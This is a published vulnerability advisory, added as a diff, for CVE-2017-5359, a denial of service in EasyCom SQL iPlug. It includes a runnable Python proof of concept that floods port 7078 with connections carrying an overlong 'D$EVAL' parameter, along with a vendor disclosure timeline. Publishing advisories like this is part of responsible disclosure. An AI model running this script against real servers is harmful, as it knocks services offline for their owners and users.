@@ -1,0 +1,99 @@
+[+] Credits: John Page AKA Hyp3rlinX	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/EASYCOM-SQL-IPLUG-DENIAL-OF-SERVICE.txt
+[+] ISR: ApparitionSec
+
+
+Vendor:
+================
+easycom-aura.com
+
+
+
+Product:
+===========
+SQL iPlug
+EasycomPHP_4.0029.iC8im2.exe
+
+SQL iPlug provides System i applications real-time access to heterogeneous and external databases
+(Oracle, SQL Server, MySQL, MS Access, Sybase, Progress) in a completely transparent manner and without requiring replication.
+
+
+
+Vulnerability Type:
+===================
+Denial Of Service
+
+
+
+CVE Reference:
+==============
+CVE-2017-5359
+
+
+
+Security Issue:
+================
+SQL iPlug listens on port 7078 by default, it suffers from denial of service when sending overly long string via
+HTTP requests fed to the "D$EVAL" parameter.
+
+
+
+Exploit/POC:
+============
+
+import socket
+
+print 'EasyCom SQL-IPLUG DOS 0day!'
+print 'hyp3rlinx'
+
+IP = raw_input("[IP]> ")
+PORT = 7078 
+payload="A"*43000
+ 
+arr=[]
+c=0
+while 1:
+    try:
+        arr.append(socket.create_connection((IP,PORT)))
+        arr[c].send('GET /?D$EVAL='+payload+" HTTP/1.1\r\n\r\n")
+        c+=1
+        print "doit!"
+    except socket.error:
+        print "[*] 5th ave 12:00"
+        raw_input()
+        break
+
+
+
+
+Disclosure Timeline:
+======================================
+Vendor Notification: December 22, 2016
+Vendor acknowledgement: December 23, 2016
+Vendor Release Fix/Version February 20, 2017
+February 22, 2017 : Public Disclosure
+
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+===========
+Medium
+
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. 
